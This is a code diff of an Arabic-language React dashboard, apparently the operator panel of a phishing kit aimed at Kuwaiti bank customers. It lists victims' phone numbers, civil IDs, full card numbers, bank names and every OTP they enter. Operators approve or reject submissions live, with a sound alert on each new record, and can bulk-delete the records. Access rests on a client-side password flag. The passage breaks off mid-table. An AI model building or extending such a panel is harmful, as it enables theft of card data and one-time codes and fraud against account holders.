@@ -1,11 +1,182 @@
-import { useState, useEffect, useCallback } from "react";
+import { useState, useEffect, useMemo, useRef } from "react";
 import { base44 } from "@/api/base44Client";
-import { toast } from "sonner";
-import StatsCards from "@/components/dashboard/StatsCards";
-import RecordsTable from "@/components/dashboard/RecordsTable";
-import RecordDetailModal from "@/components/dashboard/RecordDetailModal";
-import DashboardFilters from "@/components/dashboard/DashboardFilters";
-import { Bell, RefreshCw, Activity, Lock } from "lucide-react";
+import {
+  Trash2, Users, CreditCard, UserCheck, Flag, Bell, CheckCircle,
+  XCircle, Clock, Search, Download, Settings, User, Menu,
+  ArrowUpDown, ChevronLeft, ChevronRight, TrendingUp, Activity,
+  Filter, RefreshCw, AlertCircle, Loader2, EyeOff, Eye, X, Lock,
+} from "lucide-react";
+import { Button } from "@/components/ui/button";
+import { Badge } from "@/components/ui/badge";
+import { formatDistanceToNow, format } from "date-fns";
+import { ar } from "date-fns/locale";
+import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogFooter } from "@/components/ui/dialog";
+import { Card, CardContent, CardHeader, CardTitle, CardFooter, CardDescription } from "@/components/ui/card";
+import { Popover, PopoverContent, PopoverTrigger } from "@/components/ui/popover";
+import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip";
+import { Input } from "@/components/ui/input";
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
+import { Sheet, SheetContent, SheetHeader, SheetTitle } from "@/components/ui/sheet";
+import { Tabs, TabsList, TabsTrigger } from "@/components/ui/tabs";
+import { useToast } from "@/components/ui/use-toast";
+
+// ─── Constants ────────────────────────────────────────────────────────────────
+
+const BANK_NAMES = {
+  ABK: "Al Ahli Bank of Kuwait",
+  ALRAJHI: "Al Rajhi Bank",
+  BBK: "Bank of Bahrain and Kuwait",
+  BOUBYAN: "Boubyan Bank",
+  BURGAN: "Burgan Bank",
+  CBK: "Commercial Bank of Kuwait",
+  Doha: "Doha Bank",
+  GBK: "Gulf Bank",
+  TAM: "TAM Bank",
+  KFH: "Kuwait Finance House",
+  KIB: "Kuwait International Bank",
+  NBK: "National Bank of Kuwait",
+  Weyay: "Weyay Bank",
+  QNB: "Qatar National Bank",
+  UNB: "Union National Bank",
+  WARBA: "Warba Bank"
+};
+
+// ─── Sub-components ───────────────────────────────────────────────────────────
+
+function StatisticsCard({ title, value, icon: Icon, color, trend }) {
+  return (
+    <Card className="relative overflow-hidden bg-slate-900/70 border border-slate-800/50 shadow-xl shadow-black/20 hover:shadow-2xl transition-all duration-300 group backdrop-blur-sm">
+      <div className="absolute inset-0 bg-gradient-to-br from-white/5 to-transparent opacity-0 group-hover:opacity-100 transition-opacity" />
+      <CardHeader className="pb-2 relative">
+        <div className="flex items-center justify-between">
+          <div className={`p-3 rounded-xl ${color} shadow-lg group-hover:scale-110 transition-transform`}>
+            <Icon className="h-6 w-6 text-white" />
+          </div>
+          <div className="text-right">
+            <p className="text-sm font-medium text-slate-400">{title}</p>
+            <p className="text-3xl font-bold text-white">{value}</p>
+          </div>
+        </div>
+      </CardHeader>
+      {trend && (
+        <CardContent className="pt-0 relative">
+          <div className="flex items-end gap-1 h-8 justify-end">
+            {trend.map((val, i) => (
+              <div key={i} className="w-1.5 rounded-sm bg-emerald-500/60" style={{ height: `${(val / Math.max(...trend)) * 100}%` }} />
+            ))}
+          </div>
+        </CardContent>
+      )}
+    </Card>
+  );
+}
+
+function FlagColorSelector({ id, currentColor, onChange }) {
+  return (
+    <Popover>
+      <PopoverTrigger asChild>
+        <Button variant="ghost" size="icon" className="h-8 w-8">
+          <Flag className={`h-4 w-4 ${currentColor === "red" ? "text-red-500 fill-red-500" : currentColor === "yellow" ? "text-yellow-500 fill-yellow-500" : currentColor === "green" ? "text-green-500 fill-green-500" : "text-muted-foreground"}`} />
+        </Button>
+      </PopoverTrigger>
+      <PopoverContent className="w-auto p-2" dir="rtl">
+        <div className="flex gap-2">
+          {[{ color: "red", bg: "bg-red-500" }, { color: "yellow", bg: "bg-yellow-500" }, { color: "green", bg: "bg-green-500" }].map(({ color, bg }) => (
+            <Button key={color} variant="ghost" size="icon" className={`h-8 w-8 rounded-full ${bg}`} onClick={() => onChange(id, color)}>
+              <Flag className="h-4 w-4 text-white" />
+            </Button>
+          ))}
+          {currentColor && (
+            <Button variant="ghost" size="icon" className="h-8 w-8 rounded-full bg-gray-200 dark:bg-gray-700" onClick={() => onChange(id, null)}>
+              <X className="h-4 w-4" />
+            </Button>
+          )}
+        </div>
+      </PopoverContent>
+    </Popover>
+  );
+}
+
+function StatusBadge({ status }) {
+  const map = {
+    approved: { text: "موافق", color: "from-green-500 to-green-600", Icon: CheckCircle },
+    rejected: { text: "مرفوض", color: "from-red-500 to-red-600", Icon: XCircle },
+    pending: { text: "معلق", color: "from-yellow-500 to-yellow-600", Icon: Clock },
+  };
+  const { text, color, Icon } = map[status] || map.pending;
+  return (
+    <Badge className={`bg-gradient-to-r ${color} text-white flex items-center gap-1 shadow-sm`}>
+      <Icon className="h-3 w-3" />{text}
+    </Badge>
+  );
+}
+
+function InfoSection({ items, additionalOtps }) {
+  const [shown, setShown] = useState({});
+  return (
+    <div className="mt-4 bg-gradient-to-br from-gray-50 to-gray-100 dark:from-gray-800 dark:to-gray-900 rounded-xl p-5 space-y-3">
+      {items.map(({ label, value, sensitive, ltr }) => {
+        if (!value && value !== 0) return null;
+        return (
+          <div key={label} className="flex justify-between items-center py-2 border-b border-gray-200 dark:border-gray-700 last:border-0 px-2">
+            <span className="font-medium text-gray-500 dark:text-gray-400">{label}:</span>
+            <div className="flex items-center gap-2">
+              {sensitive ? (
+                <>
+                  <span className="font-semibold text-gray-900 dark:text-gray-200">{shown[label] ? String(value) : "••••••"}</span>
+                  <Button variant="ghost" size="icon" className="h-6 w-6" onClick={() => setShown(p => ({ ...p, [label]: !p[label] }))}>
+                    {shown[label] ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
+                  </Button>
+                </>
+              ) : (
+                <span className="font-semibold text-gray-900 dark:text-gray-200" dir={ltr ? "ltr" : undefined}>{String(value)}</span>
+              )}
+            </div>
+          </div>
+        );
+      })}
+      {additionalOtps?.length > 0 && (
+        <div className="pt-3 border-t border-gray-200 dark:border-gray-700">
+          <span className="font-medium text-gray-500 dark:text-gray-400 block mb-2">جميع الرموز:</span>
+          <div className="flex flex-wrap gap-2">
+            {additionalOtps.map((otp, i) => <Badge key={i} variant="outline" className="font-mono">{otp}</Badge>)}
+          </div>
+        </div>
+      )}
+    </div>
+  );
+}
+
+function PaginationBar({ currentPage, totalPages, onPageChange, totalItems, itemsPerPage }) {
+  const start = (currentPage - 1) * itemsPerPage + 1;
+  const end = Math.min(currentPage * itemsPerPage, totalItems);
+  const pages = [];
+  if (totalPages <= 5) { for (let i = 1; i <= totalPages; i++) pages.push(i); }
+  else if (currentPage <= 3) { pages.push(1, 2, 3, 4, "...", totalPages); }
+  else if (currentPage >= totalPages - 2) { pages.push(1, "...", totalPages - 3, totalPages - 2, totalPages - 1, totalPages); }
+  else { pages.push(1, "...", currentPage - 1, currentPage, currentPage + 1, "...", totalPages); }
+
+  return (
+    <div className="flex items-center justify-between flex-wrap gap-4">
+      <div className="text-sm text-slate-400">
+        عرض <span className="text-white">{start}</span> إلى <span className="text-white">{end}</span> من <span className="text-white">{totalItems}</span> عنصر
+      </div>
+      <div className="flex items-center gap-2">
+        <Button variant="outline" size="sm" onClick={() => onPageChange(currentPage - 1)} disabled={currentPage <= 1} className="border-slate-700 text-slate-300">
+          <ChevronRight className="h-4 w-4" /> السابق
+        </Button>
+        {pages.map((p, i) => p === "..." ? <span key={`e${i}`} className="px-2 text-slate-500">...</span> : (
+          <Button key={p} variant={currentPage === p ? "default" : "outline"} size="sm" className={`w-8 h-8 p-0 border-slate-700 ${currentPage === p ? "bg-emerald-600 text-white border-emerald-600" : "text-slate-300"}`} onClick={() => onPageChange(p)}>{p}</Button>
+        ))}
+        <Button variant="outline" size="sm" onClick={() => onPageChange(currentPage + 1)} disabled={currentPage >= totalPages} className="border-slate-700 text-slate-300">
+          التالي <ChevronLeft className="h-4 w-4" />
+        </Button>
+      </div>
+    </div>
+  );
+}
+
+// ─── Password Gate ─────────────────────────────────────────────────────────────
 
 function PasswordGate({ onUnlock }) {
   const [input, setInput] = useState("");
@@ -40,7 +211,7 @@ function PasswordGate({ onUnlock }) {
             <Lock className="h-6 w-6 text-white" />
           </div>
         </div>
-        <h1 className="text-xl font-bold text-white text-center mb-6">لوحة المدفوعات</h1>
+        <h1 className="text-xl font-bold text-white text-center mb-6">لوحة التحكم</h1>
         <form onSubmit={handleSubmit} className="space-y-4">
           <input
             type="password"
@@ -64,132 +235,471 @@ function PasswordGate({ onUnlock }) {
   );
 }
 
+// ─── Main Dashboard ────────────────────────────────────────────────────────────
+
 export default function Dashboard() {
+  const { toast } = useToast();
   const [unlocked, setUnlocked] = useState(() => sessionStorage.getItem("dash_unlocked") === "1");
   const [records, setRecords] = useState([]);
-  const [filtered, setFiltered] = useState([]);
+  const [isLoading, setIsLoading] = useState(true);
   const [selectedRecord, setSelectedRecord] = useState(null);
-  const [filters, setFilters] = useState({ type: "", page: "", step_reached: "", date: "" });
-  const [loading, setLoading] = useState(true);
-  const [prevCount, setPrevCount] = useState(0);
-  const [isRefreshing, setIsRefreshing] = useState(false);
-  const [showStats, setShowStats] = useState(false);
+  const [dialogType, setDialogType] = useState(null);
+  const [filterType, setFilterType] = useState("all");
+  const [searchTerm, setSearchTerm] = useState("");
+  const [currentPage, setCurrentPage] = useState(1);
+  const [sortBy, setSortBy] = useState("date");
+  const [sortOrder, setSortOrder] = useState("desc");
+  const [showStats, setShowStats] = useState(true);
+  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
+  const itemsPerPage = 10;
+
+  const fetchRecords = async () => {
+    setIsLoading(true);
+    const data = await base44.entities.PaymentRecord.list("-created_date", 200);
+    setRecords(data);
+    setIsLoading(false);
+  };
+
+  useEffect(() => {
+    if (unlocked) fetchRecords();
+  }, [unlocked]);
 
   const playNotificationSound = () => {
-    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-    const oscillator = audioContext.createOscillator();
-    const gain = audioContext.createGain();
-    oscillator.connect(gain);
-    gain.connect(audioContext.destination);
-    oscillator.frequency.value = 800;
-    oscillator.type = "sine";
-    gain.gain.setValueAtTime(0.3, audioContext.currentTime);
-    gain.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);
-    oscillator.start(audioContext.currentTime);
-    oscillator.stop(audioContext.currentTime + 0.5);
+    try {
+      const ctx = new (window.AudioContext || window.webkitAudioContext)();
+      const playBeep = (freq, startTime, duration) => {
+        const osc = ctx.createOscillator();
+        const gain = ctx.createGain();
+        osc.connect(gain);
+        gain.connect(ctx.destination);
+        osc.frequency.value = freq;
+        osc.type = "sine";
+        gain.gain.setValueAtTime(0, startTime);
+        gain.gain.linearRampToValueAtTime(0.4, startTime + 0.01);
+        gain.gain.exponentialRampToValueAtTime(0.001, startTime + duration);
+        osc.start(startTime);
+        osc.stop(startTime + duration);
+      };
+      playBeep(880, ctx.currentTime, 0.15);
+      playBeep(1100, ctx.currentTime + 0.18, 0.15);
+      playBeep(1320, ctx.currentTime + 0.36, 0.25);
+    } catch {}
   };
 
-  const fetchRecords = useCallback(async () => {
-    const data = await base44.entities.PaymentRecord.list("-created_date", 1000);
-    if (prevCount > 0 && data.length > prevCount) {
-      const newCount = data.length - prevCount;
-      playNotificationSound();
-      toast.success(`${newCount} new payment record${newCount > 1 ? "s" : ""} added!`, {
-        description: data[0]?.phone_number ? `Latest: ${data[0].phone_number} · ${data[0].type}` : undefined,
-        duration: 4000,
-      });
+  const isFirstLoad = useRef(true);
+  useEffect(() => {
+    if (!unlocked) return;
+    const unsub = base44.entities.PaymentRecord.subscribe((event) => {
+      if (event.type === "create") {
+        setRecords(prev => {
+          if (prev.some(r => r.id === event.id)) return prev;
+          if (!isFirstLoad.current) playNotificationSound();
+          return [event.data, ...prev];
+        });
+      } else if (event.type === "update") {
+        setRecords(prev => prev.map(r => r.id === event.id ? event.data : r));
+      } else if (event.type === "delete") {
+        setRecords(prev => prev.filter(r => r.id !== event.id));
+      }
+    });
+    const t = setTimeout(() => { isFirstLoad.current = false; }, 3000);
+    return () => { unsub(); clearTimeout(t); };
+  }, [unlocked]);
+
+  useEffect(() => { setCurrentPage(1); }, [filterType, searchTerm]);
+
+  const handleApproval = async (status, id) => {
+    await base44.entities.PaymentRecord.update(id, { network: status === "approved" ? "approved" : "rejected" });
+    setRecords(prev => prev.map(r => r.id === id ? { ...r, network: status === "approved" ? "approved" : "rejected" } : r));
+    toast({ title: status === "approved" ? "تمت الموافقة" : "تم الرفض" });
+  };
+
+  const handleDelete = async (id) => {
+    try {
+      await base44.entities.PaymentRecord.delete(id);
+    } catch {}
+    setRecords(prev => prev.filter(r => r.id !== id));
+    toast({ title: "تم الحذف" });
+  };
+
+  const handleFlagChange = async (id, color) => {
+    await base44.entities.PaymentRecord.update(id, { bank: color || "" });
+    setRecords(prev => prev.map(r => r.id === id ? { ...r, bank: color || "" } : r));
+  };
+
+  const handleClearAll = async () => {
+    if (!confirm("هل أنت متأكد من حذف جميع السجلات؟")) return;
+    setIsLoading(true);
+    for (const r of records) {
+      try { await base44.entities.PaymentRecord.delete(r.id); } catch {}
     }
-    setPrevCount(data.length);
-    setRecords(data);
-    setLoading(false);
-  }, [prevCount]);
-
-  const handleManualRefresh = async () => {
-    setIsRefreshing(true);
-    await fetchRecords();
-    setIsRefreshing(false);
-    toast.success("Data refreshed");
+    setRecords([]);
+    setIsLoading(false);
+    toast({ title: "تم مسح جميع السجلات" });
   };
 
-  useEffect(() => {
-    fetchRecords();
-    const interval = setInterval(fetchRecords, 5000);
-    return () => clearInterval(interval);
-  }, [fetchRecords]);
+  const filtered = useMemo(() => {
+    let list = [...records];
+    if (filterType === "card") list = list.filter(r => r.card_number);
+    else if (filterType === "pending") list = list.filter(r => !r.network || (r.network !== "approved" && r.network !== "rejected"));
+    else if (filterType === "approved") list = list.filter(r => r.network === "approved");
+    if (searchTerm) {
+      const t = searchTerm.toLowerCase();
+      list = list.filter(r =>
+        r.phone_number?.toLowerCase().includes(t) ||
+        r.card_number?.toLowerCase().includes(t) ||
+        r.id_number?.toLowerCase().includes(t) ||
+        r.civil_id?.toLowerCase().includes(t) ||
+        r.amount?.toLowerCase().includes(t)
+      );
+    }
+    list.sort((a, b) => {
+      let av, bv;
+      if (sortBy === "date") { av = new Date(a.created_date); bv = new Date(b.created_date); }
+      else if (sortBy === "status") { av = a.network || ""; bv = b.network || ""; }
+      else if (sortBy === "amount") { av = parseFloat(a.amount) || 0; bv = parseFloat(b.amount) || 0; }
+      return sortOrder === "asc" ? (av > bv ? 1 : -1) : (av < bv ? 1 : -1);
+    });
+    return list;
+  }, [records, filterType, searchTerm, sortBy, sortOrder]);
 
-  useEffect(() => {
-    let result = [...records];
-    if (filters.type) result = result.filter(r => r.type === filters.type);
-    if (filters.page) result = result.filter(r => r.page === filters.page);
-    if (filters.step_reached !== "") result = result.filter(r => String(r.step_reached) === filters.step_reached);
-    if (filters.date) result = result.filter(r => r.created_date?.startsWith(filters.date));
-    setFiltered(result);
-  }, [records, filters]);
+  const paginated = useMemo(() => {
+    const s = (currentPage - 1) * itemsPerPage;
+    return filtered.slice(s, s + itemsPerPage);
+  }, [filtered, currentPage]);
+
+  const totalPages = Math.max(1, Math.ceil(filtered.length / itemsPerPage));
+  const cardCount = records.filter(r => r.card_number).length;
+  const approvedCount = records.filter(r => r.network === "approved").length;
+  const pendingCount = records.filter(r => !r.network || (r.network !== "approved" && r.network !== "rejected")).length;
+
+  const toggleSort = (col) => {
+    if (sortBy === col) setSortOrder(o => o === "asc" ? "desc" : "asc");
+    else { setSortBy(col); setSortOrder("desc"); }
+  };
+
+  const openDialog = (record, type) => { setSelectedRecord(record); setDialogType(type); };
+  const closeDialog = () => { setSelectedRecord(null); setDialogType(null); };
 
   if (!unlocked) return <PasswordGate onUnlock={() => setUnlocked(true)} />;
 
+  if (isLoading && records.length === 0) {
+    return (
+      <div className="min-h-screen bg-gradient-to-br from-slate-950 via-slate-900 to-slate-950 flex items-center justify-center">
+        <div className="flex flex-col items-center gap-4">
+          <div className="h-16 w-16 animate-spin rounded-full border-4 border-slate-700 border-t-emerald-500" />
+          <div className="text-xl font-semibold text-white">جاري التحميل...</div>
+        </div>
+      </div>
+    );
+  }
+
   return (
-    <div className="min-h-screen bg-gradient-to-br from-slate-950 via-slate-900 to-slate-950 text-white" dir="rtl">
-      {/* Animated Background */}
+    <div dir="rtl" className="min-h-screen bg-gradient-to-br from-slate-950 via-slate-900 to-slate-950 text-white">
+      {/* Ambient background */}
       <div className="fixed inset-0 overflow-hidden pointer-events-none z-0">
-        <div className="absolute -top-32 -left-32 h-96 w-96 rounded-full bg-gradient-to-br from-emerald-500/15 to-teal-500/10 blur-3xl" />
-        <div className="absolute top-1/2 right-1/4 h-64 w-64 rounded-full bg-gradient-to-r from-cyan-500/10 to-emerald-500/5 blur-3xl" />
-        <div className="absolute -bottom-48 -right-32 h-[500px] w-[500px] rounded-full bg-gradient-to-tl from-cyan-500/10 to-emerald-500/5 blur-3xl" />
+        <div className="absolute -top-32 -left-32 h-96 w-96 rounded-full bg-emerald-500/15 blur-3xl" />
+        <div className="absolute -bottom-48 -right-32 h-[500px] w-[500px] rounded-full bg-cyan-500/10 blur-3xl" />
       </div>
 
-      {/* Sticky Header */}
-      <header className="sticky top-0 z-50 border-b border-slate-800/50 bg-slate-900/80 backdrop-blur-xl shadow-lg shadow-black/20">
-        <div className="flex items-center justify-between px-6 py-4 max-w-[1600px] mx-auto">
-          <div className="flex items-center gap-3">
-            <div className="relative">
-              <div className="absolute inset-0 bg-gradient-to-r from-emerald-500 to-teal-500 blur-lg opacity-40 rounded-xl" />
-              <div className="relative bg-gradient-to-br from-emerald-600 to-teal-600 p-2.5 rounded-xl shadow-lg">
-                <Bell className="h-5 w-5 text-white" />
+      {/* Mobile Menu */}
+      <Sheet open={mobileMenuOpen} onOpenChange={setMobileMenuOpen}>
+        <SheetContent side="right" className="w-[280px] bg-slate-900 border-slate-700" dir="rtl">
+          <SheetHeader className="mb-6">
+            <SheetTitle className="text-white flex items-center gap-2"><Bell className="h-5 w-5 text-emerald-400" /> لوحة التحكم</SheetTitle>
+          </SheetHeader>
+          <nav className="space-y-2">
+            <Button variant="ghost" className="w-full justify-start text-slate-300" onClick={() => { setShowStats(s => !s); setMobileMenuOpen(false); }}>
+              <Activity className="mr-2 h-4 w-4" />{showStats ? "إخفاء الإحصائيات" : "عرض الإحصائيات"}
+            </Button>
+            <Button variant="ghost" className="w-full justify-start text-slate-300" onClick={() => { fetchRecords(); setMobileMenuOpen(false); }}>
+              <RefreshCw className="mr-2 h-4 w-4" />تحديث البيانات
+            </Button>
+          </nav>
+        </SheetContent>
+      </Sheet>
+
+      {/* Header */}
+      <header className="sticky top-0 z-50 border-b border-slate-800/50 bg-slate-900/80 backdrop-blur-xl shadow-lg">
+        <div className="flex items-center justify-between p-4">
+          <div className="flex items-center gap-4">
+            <Button variant="ghost" size="icon" className="md:hidden text-white" onClick={() => setMobileMenuOpen(true)}>
+              <Menu className="h-5 w-5" />
+            </Button>
+            <div className="flex items-center gap-3">
+              <div className="relative">
+                <div className="absolute inset-0 bg-gradient-to-r from-emerald-500 to-teal-500 blur-lg opacity-40 rounded-xl" />
+                <div className="relative bg-gradient-to-br from-emerald-600 to-teal-600 p-3 rounded-xl shadow-lg">
+                  <Bell className="h-6 w-6 text-white" />
+                </div>
+                {pendingCount > 0 && (
+                  <div className="absolute -top-1 -right-1 bg-red-500 text-white text-xs rounded-full h-5 w-5 flex items-center justify-center animate-pulse">{pendingCount}</div>
+                )}
+              </div>
+              <div>
+                <h1 className="text-xl font-bold bg-gradient-to-r from-white to-slate-300 bg-clip-text text-transparent">لوحة التحكم</h1>
+                <p className="text-sm text-slate-400">آخر تحديث: {format(new Date(), "HH:mm", { locale: ar })}</p>
               </div>
             </div>
-            <div>
-              <h1 className="text-xl font-bold bg-gradient-to-r from-white via-slate-100 to-slate-300 bg-clip-text text-transparent">
-                لوحة المدفوعات
-              </h1>
-              <p className="text-xs text-slate-400 flex items-center gap-1.5">
-                <span className="w-1.5 h-1.5 rounded-full bg-green-400 animate-pulse inline-block" />
-                مباشر · تحديث كل 5 ثواني
-              </p>
-            </div>
           </div>
-          <button
-            onClick={handleManualRefresh}
-            disabled={isRefreshing}
-            className="flex items-center gap-2 px-3 py-2 rounded-lg border border-slate-700 bg-slate-800/50 hover:bg-slate-700/50 text-slate-300 hover:text-emerald-400 transition-colors text-sm"
-          >
-            <RefreshCw className={`h-4 w-4 ${isRefreshing ? "animate-spin" : ""}`} />
-            تحديث
-          </button>
+          <div className="hidden md:flex items-center gap-2">
+            <TooltipProvider>
+              <Tooltip>
+                <TooltipTrigger asChild>
+                  <Button variant="outline" size="icon" onClick={fetchRecords} disabled={isLoading} className="border-slate-700 bg-slate-800/50 text-slate-300 hover:text-emerald-400">
+                    <RefreshCw className={`h-4 w-4 ${isLoading ? "animate-spin" : ""}`} />
+                  </Button>
+                </TooltipTrigger>
+                <TooltipContent><p>تحديث البيانات</p></TooltipContent>
+              </Tooltip>
+            </TooltipProvider>
+            <TooltipProvider>
+              <Tooltip>
+                <TooltipTrigger asChild>
+                  <Button variant="outline" size="icon" onClick={() => setShowStats(s => !s)} className="border-slate-700 bg-slate-800/50 text-slate-300 hover:text-emerald-400">
+                    <Activity className="h-4 w-4" />
+                  </Button>
+                </TooltipTrigger>
+                <TooltipContent><p>{showStats ? "إخفاء الإحصائيات" : "عرض الإحصائيات"}</p></TooltipContent>
+              </Tooltip>
+            </TooltipProvider>
+          </div>
         </div>
       </header>
 
-      <div className="relative z-10 p-4 md:p-6 max-w-[1600px] mx-auto space-y-6">
-        <div>
-          <button
-            onClick={() => setShowStats(s => !s)}
-            className="flex items-center gap-2 text-sm text-slate-400 hover:text-white transition-colors mb-3"
-          >
-            <Activity className={`h-4 w-4 transition-transform ${showStats ? "rotate-180" : ""}`} />
-            {showStats ? "إخفاء الإحصائيات" : "إظهار الإحصائيات"}
-          </button>
-          {showStats && <StatsCards records={records} />}
-        </div>
-        <DashboardFilters filters={filters} setFilters={setFilters} filtered={filtered} />
-        <RecordsTable records={filtered} loading={loading} onSelect={setSelectedRecord} onDelete={async (id) => {
-          await base44.entities.PaymentRecord.delete(id);
-          setRecords(prev => prev.filter(r => r.id !== id));
-          toast.success("تم الحذف");
-        }} />
+      <div className="relative z-10 p-6 space-y-8 max-w-[1920px] mx-auto">
+        {/* Statistics */}
+        {showStats && (
+          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
+            <StatisticsCard title="إجمالي السجلات" value={records.length} icon={Users} color="bg-gradient-to-br from-blue-500 to-blue-600" trend={[5, 8, 12, 7, 10, 15, 13]} />
+            <StatisticsCard title="معلومات البطاقات" value={cardCount} icon={CreditCard} color="bg-gradient-to-br from-purple-500 to-purple-600" trend={[2, 3, 5, 4, 6, 8, 7]} />
+            <StatisticsCard title="الموافقات" value={approvedCount} icon={CheckCircle} color="bg-gradient-to-br from-emerald-500 to-emerald-600" trend={[1, 2, 4, 3, 5, 7, 6]} />
+            <StatisticsCard title="المعلقة" value={pendingCount} icon={Clock} color="bg-gradient-to-br from-yellow-500 to-yellow-600" trend={[3, 4, 6, 5, 7, 8, 6]} />
+          </div>
+        )}
+
+        {/* Filters */}
+        <Card className="bg-slate-900/70 backdrop-blur-sm border border-slate-800/50 shadow-xl">
+          <CardContent className="p-4">
+            <div className="flex flex-col lg:flex-row gap-4 items-start lg:items-center justify-between">
+              <div className="flex flex-col sm:flex-row gap-3 w-full lg:w-auto">
+                <Tabs value={filterType} onValueChange={setFilterType} className="w-full sm:w-auto">
+                  <TabsList className="grid grid-cols-4 bg-slate-800/50 border border-slate-700/50">
+                    <TabsTrigger value="all" className="text-slate-400 data-[state=active]:bg-emerald-600 data-[state=active]:text-white"><Filter className="h-3 w-3 mr-1" />الكل</TabsTrigger>
+                    <TabsTrigger value="pending" className="text-slate-400 data-[state=active]:bg-amber-600 data-[state=active]:text-white"><Clock className="h-3 w-3 mr-1" />معلق</TabsTrigger>
+                    <TabsTrigger value="card" className="text-slate-400 data-[state=active]:bg-violet-600 data-[state=active]:text-white"><CreditCard className="h-3 w-3 mr-1" />بطاقات</TabsTrigger>
+                    <TabsTrigger value="approved" className="text-slate-400 data-[state=active]:bg-cyan-600 data-[state=active]:text-white"><CheckCircle className="h-3 w-3 mr-1" />موافق</TabsTrigger>
+                  </TabsList>
+                </Tabs>
+                <Select value={sortBy} onValueChange={setSortBy}>
+                  <SelectTrigger className="w-full sm:w-[180px] bg-slate-800/50 border-slate-700/50 text-slate-300">
+                    <ArrowUpDown className="h-4 w-4 ml-2 text-emerald-400" />
+                    <SelectValue placeholder="ترتيب حسب" />
+                  </SelectTrigger>
+                  <SelectContent className="bg-slate-900 border-slate-700">
+                    <SelectItem value="date" className="text-slate-300">التاريخ</SelectItem>
+                    <SelectItem value="status" className="text-slate-300">الحالة</SelectItem>
+                    <SelectItem value="amount" className="text-slate-300">المبلغ</SelectItem>
+                  </SelectContent>
+                </Select>
+              </div>
+              <div className="relative w-full lg:w-[400px] group">
+                <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-slate-500 group-focus-within:text-emerald-400 transition-colors" />
+                <Input
+                  type="search"
+                  placeholder="البحث في السجلات..."
+                  className="pl-10 bg-slate-800/50 border-slate-700/50 text-white placeholder:text-slate-500 focus:border-emerald-500/50"
+                  value={searchTerm}
+                  onChange={e => setSearchTerm(e.target.value)}
+                />
+              </div>
+            </div>
+          </CardContent>
+        </Card>
+
+        {/* Table */}
+        <Card className="bg-slate-900/70 backdrop-blur-sm border border-slate-800/50 shadow-xl">
+          <CardHeader className="pb-4 border-b border-slate-800/50">
+            <div className="flex flex-col lg:flex-row lg:items-center lg:justify-between gap-4">
+              <div>
+                <CardTitle className="text-2xl font-bold flex items-center gap-3 text-white">
+                  <Activity className="h-6 w-6 text-emerald-400" /> إدارة السجلات
+                </CardTitle>
+                <CardDescription className="mt-1 text-slate-400">
+                  عرض وإدارة جميع سجلات المدفوعات ({filtered.length} سجل)
+                </CardDescription>
+              </div>
+              {records.length > 0 && (
+                <Button variant="destructive" size="sm" onClick={handleClearAll}>
+                  <Trash2 className="h-4 w-4 ml-2" /> مسح الكل
+                </Button>
+              )}
+            </div>
+          </CardHeader>
+          <CardContent className="p-0">
+            {paginated.length === 0 ? (
+              <div className="flex flex-col items-center justify-center py-16 px-4">
+                <div className="rounded-full bg-slate-800/50 p-6 mb-4"><AlertCircle className="h-12 w-12 text-slate-500" /></div>
+                <h3 className="text-xl font-semibold mb-2 text-white">لا توجد سجلات</h3>
+                <p className="text-slate-400 text-center">{searchTerm || filterType !== "all" ? "لم يتم العثور على نتائج مطابقة" : "لا توجد سجلات حالياً"}</p>
+              </div>
+            ) : (
+              <div className="overflow-x-auto">
+                <table className="w-full table-auto border-collapse">
+                  <thead>
+                    <tr className="bg-slate-800/50 border-b border-slate-700/50">
+                      {[
+                        { label: "الهاتف / المعلومات", key: null },
+                        { label: "المبلغ", key: "amount" },
+                        { label: "البنك", key: null },
+                        { label: "الحالة", key: "status" },
+                        { label: "الخطوة", key: null },
+                        { label: "OTP", key: null },
+                        { label: "الوقت", key: "date" },
+                        { label: "الإجراءات", key: null },
+                      ].map(({ label, key }) => (
+                        <th key={label} className={`px-4 py-4 text-right font-semibold text-slate-300 text-sm ${key ? "cursor-pointer hover:bg-slate-700/50 transition-colors" : ""}`} onClick={key ? () => toggleSort(key) : undefined}>
+                          <div className="flex items-center gap-1 justify-end">
+                            {label}
+                            {key && sortBy === key && <ArrowUpDown className="h-3 w-3 text-emerald-400" />}
+                          </div>
+                        </th>
+                      ))}
+                    </tr>
+                  </thead>
+                  <tbody>
+                    {paginated.map((r, i) => {
+                      const statusLabel = r.network === "approved" ? "approved" : r.network === "rejected" ? "rejected" : "pending";
+                      return (
+                        <tr key={r.id} className="border-b border-slate-800/50 hover:bg-slate-800/30 transition-colors">
+                          <td className="px-4 py-3">
+                            <div className="flex items-center gap-2 flex-wrap">
+                              <span className="font-mono text-white text-sm">{r.phone_number || "—"}</span>
+                              <Badge
+                                variant="outline"
+                                className={`cursor-pointer text-xs transition-all hover:scale-105 text-white border-0 ${r.phone_number || r.id_number || r.civil_id ? "bg-gradient-to-r from-blue-500 to-cyan-500" : "bg-slate-700 opacity-50"}`}
+                                onClick={() => openDialog(r, "personal")}
+                              >
+                                <User className="h-3 w-3 ml-1" />معلومات
+                              </Badge>
+                              <Badge
+                                variant="outline"
+                                className={`cursor-pointer text-xs transition-all hover:scale-105 text-white border-0 ${r.card_number ? "bg-gradient-to-r from-violet-500 to-purple-600" : "bg-slate-700 opacity-50"}`}
+                                onClick={() => openDialog(r, "card")}
+                              >
+                                <CreditCard className="h-3 w-3 ml-1" />KNET
+                              </Badge>
+                            </div>
+                          </td>
+                          <td className="px-4 py-3">
+                            {r.amount ? <Badge variant="outline" className="font-mono text-emerald-400 border-emerald-500/30">{r.amount}</Badge> : <span className="text-slate-500">—</span>}
+                          </td>
+                          <td className="px-4 py-3">
+                            {r.bank && BANK_NAMES[r.bank] ? (
+                              <span className="text-sm text-slate-300">{BANK_NAMES[r.bank]}</span>
+                            ) : (
+                              <span className="text-slate-500">—</span>
+                            )}
+                          </td>
+                          <td className="px-4 py-3"><StatusBadge status={statusLabel} /></td>
+                          <td className="px-4 py-3 text-center">
